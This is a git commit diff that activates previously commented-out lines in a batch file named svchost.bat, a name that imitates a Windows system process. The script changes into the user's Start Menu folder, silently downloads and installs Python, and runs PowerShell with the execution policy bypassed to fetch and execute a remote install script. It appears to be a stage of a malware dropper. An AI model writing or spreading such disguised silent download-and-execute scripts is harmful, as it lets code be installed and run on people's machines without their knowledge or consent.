d52b8e4c8458e818fac2df659974e7ec13393b7e
Mikey <80923101+skyyriiz@users.noreply.github.com>
2023-06-02 10:08:31 +0200

    remove comments + fix code

--- svchost.bat
+++ svchost.bat
@@ -1,8 +1,8 @@
 cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\
 
-REM curl -O https://www.python.org/ftp/python/3.9.9/python-3.9.9-amd64.exe
+curl -O https://www.python.org/ftp/python/3.9.9/python-3.9.9-amd64.exe
 
-REM python-3.9.9-amd64.exe /quiet InstallAllUsers=1 PrependPath=1"
+python-3.9.9-amd64.exe /quiet InstallAllUsers=1 PrependPath=1"
 
 @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))" && SET "PATH=%PATH%;%ALLUSERSPROFILE%\chocolatey\bin"
 
